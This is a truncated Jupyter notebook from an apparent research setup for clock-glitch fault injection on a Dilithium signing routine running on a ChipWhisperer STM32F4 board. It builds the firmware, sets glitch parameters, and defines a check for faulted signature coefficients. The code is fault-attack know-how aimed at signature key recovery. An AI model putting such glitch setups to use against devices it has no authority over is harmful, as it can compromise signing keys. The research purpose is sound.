{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Dilithium - Glitches - Fixediter"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "SCOPETYPE = 'OPENADC'\n",
    "PLATFORM = 'CW308_STM32F4'\n",
    "SS_VER = 'SS_VER_2_1'\n",
    "\n",
    "TIMEOUT = 510\n",
    "N = 256\n",
    "NUM_ITERS = 64\n",
    "BETA = 78"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import logging\n",
    "logging.basicConfig(level=logging.NOTSET)\n",
    "logging.getLogger('io.github.alex1s.python-dilithium').setLevel(logging.WARNING)\n",
    "logging.getLogger('gurobipy.gurobipy').setLevel(logging.WARNING) # please be quiet gurobi\n",
    "logging.getLogger().setLevel(logging.DEBUG + 1) # default logger should not be used anyways!\n",
    "__LOGGER = logging.getLogger('sigglitches')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "we append the path so that we can use the chipwhisperer library"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/home/alexis/chipwhisperer.dilithium/jupyter/courses/fault101',\n",
       " '/usr/lib/python38.zip',\n",
       " '/usr/lib/python3.8',\n",
       " '/usr/lib/python3.8/lib-dynload',\n",
       " '',\n",
       " '/home/alexis/.venvs/chipwhisperer.dilithium/lib/python3.8/site-packages',\n",
       " '../../../software',\n",
       " 'python-dilithium',\n",
       " 'dilithium_solver']"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import sys\n",
    "if '../../../software' not in sys.path:\n",
    "    sys.path.append('../../../software')\n",
    "if 'python-dilithium' not in sys.path:\n",
    "    sys.path.append('python-dilithium')\n",
    "if 'dilithium_solver' not in sys.path:\n",
    "    sys.path.append('dilithium_solver')\n",
    "sys.path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(<module 'chipwhisperer' from '/home/alexis/chipwhisperer.dilithium/jupyter/courses/fault101/../../../software/chipwhisperer/__init__.py'>,\n",
       " <dilithium.Dilithium at 0x7fda087c26a0>)"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import chipwhisperer as cw\n",
    "import importlib\n",
    "import json\n",
    "import uuid\n",
    "import numpy as np\n",
    "import ipywidgets as widgets\n",
    "from chipwhisperer.capture.targets import TargetIOError, TargetTimeoutError\n",
    "from dilithium import Dilithium\n",
    "import struct\n",
    "d = Dilithium(2)\n",
    "cw, d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SS_VER set to SS_VER_2_1\n",
      "SS_VER set to SS_VER_2_1\n",
      "make[1]: '.dep' is up to date.\n",
      "SS_VER set to SS_VER_2_1\n",
      ".\n",
      "Welcome to another exciting ChipWhisperer target build!!\n",
      "arm-none-eabi-gcc (15:9-2019-q4-0ubuntu1) 9.2.1 20191025 (release) [ARM/arm-9-branch revision 277599]\n",
      "Copyright (C) 2019 Free Software Foundation, Inc.\n",
      "This is free software; see the source for copying conditions.  There is NO\n",
      "warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n",
      "\n",
      ".\n",
      "Compiling:\n",
      "-en     simpleserial-dilithium-ref.c ...\n",
      "mkdir -p \"objdir-CW308_STM32F4\"\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././simpleserial/simpleserial.c ...\n",
      "mkdir -p \"objdir-CW308_STM32F4\"\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././hal/stm32f4/stm32f4_hal.c ...\n",
      "mkdir -p \"objdir-CW308_STM32F4\"\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "In file included from .././hal/stm32f4/stm32f4_hal.c:3:\n",
      ".././hal/stm32f4/stm32f4_hal_lowlevel.h:108: warning: \"STM32F415xx\" redefined\n",
      "  108 | #define STM32F415xx\n",
      "      | \n",
      "<command-line>: note: this is the location of the previous definition\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././hal/stm32f4/stm32f4_hal_lowlevel.c ...\n",
      "mkdir -p \"objdir-CW308_STM32F4\"\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "In file included from .././hal/stm32f4/stm32f4_hal_lowlevel.c:39:\n",
      ".././hal/stm32f4/stm32f4_hal_lowlevel.h:108: warning: \"STM32F415xx\" redefined\n",
      "  108 | #define STM32F415xx\n",
      "      | \n",
      "<command-line>: note: this is the location of the previous definition\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././hal/stm32f4/stm32f4_sysmem.c ...\n",
      "mkdir -p \"objdir-CW308_STM32F4\"\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././hal/stm32f4/stm32f4xx_hal_rng.c ...\n",
      "mkdir -p \"objdir-CW308_STM32F4\"\n",
      "-e Done!\n",
      ".\n",
      "Assembling: .././hal/stm32f4/stm32f4_startup.S\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir-CW308_STM32F4/stm32f4_startup.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f4 -I.././hal/stm32f4/CMSIS -I.././hal/stm32f4/CMSIS/core -I.././hal/stm32f4/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ .././hal/stm32f4/stm32f4_startup.S -o objdir-CW308_STM32F4/stm32f4_startup.o\n",
      ".\n",
      "LINKING:\n",
      "-en     simpleserial-dilithium-ref-CW308_STM32F4.elf ...\n",
      "-e Done!\n",
      ".\n",
      "Creating load file for Flash: simpleserial-dilithium-ref-CW308_STM32F4.hex\n",
      "arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature simpleserial-dilithium-ref-CW308_STM32F4.elf simpleserial-dilithium-ref-CW308_STM32F4.hex\n",
      ".\n",
      "Creating load file for Flash: simpleserial-dilithium-ref-CW308_STM32F4.bin\n",
      "arm-none-eabi-objcopy -O binary -R .eeprom -R .fuse -R .lock -R .signature simpleserial-dilithium-ref-CW308_STM32F4.elf simpleserial-dilithium-ref-CW308_STM32F4.bin\n",
      ".\n",
      "Creating load file for EEPROM: simpleserial-dilithium-ref-CW308_STM32F4.eep\n",
      "arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom=\"alloc,load\" \\\n",
      "--change-section-lma .eeprom=0 --no-change-warnings -O ihex simpleserial-dilithium-ref-CW308_STM32F4.elf simpleserial-dilithium-ref-CW308_STM32F4.eep || exit 0\n",
      ".\n",
      "Creating Extended Listing: simpleserial-dilithium-ref-CW308_STM32F4.lss\n",
      "arm-none-eabi-objdump -h -S -z simpleserial-dilithium-ref-CW308_STM32F4.elf > simpleserial-dilithium-ref-CW308_STM32F4.lss\n",
      ".\n",
      "Creating Symbol Table: simpleserial-dilithium-ref-CW308_STM32F4.sym\n",
      "arm-none-eabi-nm -n simpleserial-dilithium-ref-CW308_STM32F4.elf > simpleserial-dilithium-ref-CW308_STM32F4.sym\n",
      "SS_VER set to SS_VER_2_1\n",
      "Size after:\n",
      "   text\t   data\t    bss\t    dec\t    hex\tfilename\n",
      "  16236\t   6540\t   5136\t  27912\t   6d08\tsimpleserial-dilithium-ref-CW308_STM32F4.elf\n",
      "+--------------------------------------------------------\n",
      "+ Default target does full rebuild each time.\n",
      "+ Specify buildtarget == allquick == to avoid full rebuild\n",
      "+--------------------------------------------------------\n",
      "+--------------------------------------------------------\n",
      "+ Built for platform CW308T: STM32F4 Target with:\n",
      "+ CRYPTO_TARGET = NONE\n",
      "+ CRYPTO_OPTIONS = NONE\n",
      "+--------------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "%%bash -s \"$PLATFORM\" \"$SS_VER\"\n",
    "cd ../../../hardware/victims/firmware/simpleserial-dilithium-ref\n",
    "make PLATFORM=$1 CRYPTO_TARGET=NONE CRYPTO_OPTIONS=NONE SS_VER=$2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer NAEUSB WARNING|File naeusb.py:713) Your firmware (0.30) is outdated - latest is 0.64 See https://chipwhisperer.readthedocs.io/en/latest/firmware.html for more information\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "INFO: Found ChipWhisperer😍\n"
     ]
    }
   ],
   "source": [
    "%run \"../../Setup_Scripts/Setup_Generic_Dilithium.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "fw_path = \"../../../hardware/victims/firmware/simpleserial-dilithium-ref/simpleserial-dilithium-ref-{}.hex\".format(PLATFORM)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "#cw.program_target(scope, prog, fw_path)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "# found using\n",
    "# target.filter_msgs_one_iter([struct.pack('!H', i) for i in range(10)])\n",
    "msgs_no_retry = [b'\\x00\\x01', b'\\x00\\x02', b'\\x00\\x07', b'\\x00\\t']\n",
    "the_msg = msgs_no_retry[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "clock cycle duration all = 4698\n",
      "clock cycle duration iteration = 73\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([[-100321,   65070,    9592, ...,  103227,   -3425,   17889],\n",
       "       [-107453,  -81618,   31730, ...,  122362,  -45288,   23573],\n",
       "       [  88900, -128866, -104785, ...,  -48187, -104331,   71746],\n",
       "       [  -9268,   50775,   -6038, ..., -118320,  130605,  -62888]])"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def dilithium2_polyz_unpack_settings():\n",
    "    scope.default_setup()\n",
    "    scope.cglitch_setup() # default_setup for clock glitching\n",
    "    scope.clock.adc_src = \"clkgen_x1\" # we do not need x4 as we do not capture traces; maybe speedup?\n",
    "    scope.adc.samples = 0 # maybe speedup?\n",
    "    scope.adc.timeout = .000000002 # wtf why is this not working\n",
    "\n",
    "def get_duration():\n",
    "    dilithium2_polyz_unpack_settings()\n",
    "    target.reboot_flush()\n",
    "    scope.arm()\n",
    "    target.loop(TIMEOUT)\n",
    "    timed_out = scope.capture()\n",
    "    assert not timed_out\n",
    "    return scope.adc.trig_count;\n",
    "\n",
    "def get_sig_correct() -> bytes:\n",
    "    dilithium2_polyz_unpack_settings()\n",
    "    target.sign(the_msg, timeout=TIMEOUT)\n",
    "    return target.get_sig()\n",
    "\n",
    "dilithium2_polyz_unpack_settings()\n",
    "duration = get_duration()\n",
    "iter_duration = duration // NUM_ITERS\n",
    "sig_correct = get_sig_correct()\n",
    "_, z_correct, _ = d._unpack_sig(sig_correct)\n",
    "poly_correct = z_correct[0]\n",
    "\n",
    "print(f'clock cycle duration all = {duration}')\n",
    "print(f'clock cycle duration iteration = {iter_duration}')\n",
    "z_correct"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_iter(poly_candidate: np.ndarray, coeffs_per_iter: int = 4, beta: int = BETA) -> bool:\n",
    "    \"\"\"\n",
    "    0 = all coeffs zero; 1 - 63 = some non faulted in the beginning rest zero;\n",
    "    64 = no fault; None = not our fault model (i.e. faults within iters)\n",
    "    \"\"\"\n",
    "    for i in range(0, NUM_ITERS + 1):\n",
    "        # index of the first zero coefficient due to a fault\n",
    "        split_index = i * coeffs_per_iter\n",
    "        if np.all(np.abs(poly_candidate[split_index:]) <= beta):\n",
    "            return i\n",
    "    return None"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "glitch_spots = [2 * 62 - 73] # target iter #2]\n",
    "width_start = 6.640625\n",
    "width_stop = 6.640625\n",
    "offset_start = 6.640625\n",
    "offset_stop = 6.640625\n",
    "msg_start = 0\n",
    "msg_stop = 2 ** 16 -1\n",
    "repeat = 1\n",
    "step = 1\n",
    "redo = 0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1.0 1.0 1\n",
      "0.0\n",
      "Expected sig time: 0.0s = 0.0min = 0.0h\n",
      "Expected sig + transfer time: 0.0s = 0.0min = 0.0h\n"
     ]
    }
   ],
   "source": [
    "width_width = (width_stop - width_start + 1) / step\n",
    "offset_width = (offset_stop - offset_start + 1) / step\n",
    "ext_offset_width = len(glitch_spots)\n",
    "print(width_width, offset_width, ext_offset_width)\n",
    "normal_time = width_width * offset_width * ext_offset_width * redo\n",
    "print(normal_time)\n",
    "t = TIMEOUT * normal_time / 1000\n",
    "print(f'Expected sig time: {t}s = {t/60}min = {t/3600}h')\n",
    "t_all = t * 2.5 # what was that exactly again?\n",
    "print(f'Expected sig + transfer time: {t_all}s = {t_all/60}min = {t_all/3600}h')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5434e4bc5fb64e17ae62997b71c50969",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_0 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d592085076f045ed9150c72e9196bca9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_1 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b188c9064ba44d688df8d266f4d24b4e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_2 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "978d799eea1b4619b9272635d2421128",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_3 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ec2258148df54482acb72b619d274b16",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_4 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bf03d799de4941e693782f5fc7c4b963",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_5 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9cde51d980ec41eeb02d8427302f3429",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_6 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e46b177b3f8e4b2baf31eec160f9ad9f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_7 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c4809918d31a4d7e87ae51574a382ca8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_8 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "80a600a31d8a4b5ea3d667999445265e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_9 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "82036cc4dcdc4c889639f93669118fcb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_10 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "be1b2e0e151c4ed096e5958075167477",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_11 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cdf1dd5eec4948eca8694bde2a1a7d64",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_12 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3f31fed5671540049bc95d679917796d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_13 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "68502bc6e1b44111a0f594bcd9ae6d4c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_14 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d82f0d0a0eac48a78d6dfab5575af81c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_15 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "899c45bbb0e247f0bd0e83be5e9478d8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_16 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6e482c9fc93941759410fc604b05b8aa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_17 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7bcfd83244ed43e381d446b4cc163787",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_18 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3db45d605dea43caa08ac6ee1a715636",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_19 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "21877dfe216648f49710eb1b37f51ce0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_20 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "39ebe98283c0444fa33688dfc3ec6990",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_21 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "867a060d223d4a6c94a6de508ccd8fbf",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_22 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3aaf3d3dc4ae41f5b12de3b131ba6c58",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_23 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ee8a4e9287274b9fa686944d47c8c115",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_24 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9275ad5f90374a8d8210e4e694241ae0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_25 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d5d02f6b63674a3bb4ca9920bd7df518",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_26 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a38c9824a01f4079b35e8823f45adee1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_27 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cc1b0a1cef4d4e0aabc31620266e1573",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_28 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7fb2b30834d6429088baa4aeaa6da271",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_29 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9f97fd4500e34fb5ba46eacee2013a62",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_30 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5e1a5a2c77204b358b7e731657afdc68",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_31 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "34c81c654b1d42f19ac60e1a36ccfbf2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_32 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5ff334dddd4f4051a68c166568457887",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_33 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2fae7e2bfc2c4a749c358c11b21ff9c2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_34 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9ba8b2ed59e242959d6daa75b647feba",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_35 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3133355b4cf843dba42594e749dc83d0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_36 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "327a187139654ec29029a1eadfe2fe2f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_37 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "869c86fcd5e34c23a6e6c682bbbae127",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_38 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "008a323f9ed947c4b7cf2a2cfcf0040b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_39 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9e64c4aa9a8f456780e477099d8ed2bb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_40 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9949bcecf8f141c4a068fa6146132c84",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_41 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2c83d1db29a04a9189d24a08c2a22183",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_42 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "69e90df6b5954355b9c5c2a60ccbe286",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_43 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e68dd268486c442facb80e57f25b8f55",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_44 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e7ec94d0574c479dbd71e54e282ce446",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_45 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7de1f86fb269462f8d27625fedb81e48",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_46 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bce711ce226641e995bb4276b64d036d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_47 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dc30c12e0bcc4b5c8a0847dfc3aba917",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_48 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bdfb4899698443019d49fd7adca51a0a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_49 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e784d0179224416aad163031e9f49e6c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_50 count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4b75f436506c437a8624f8f14d98e2d6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='perfect_51 count:', disabled=True)"
      ]
     },
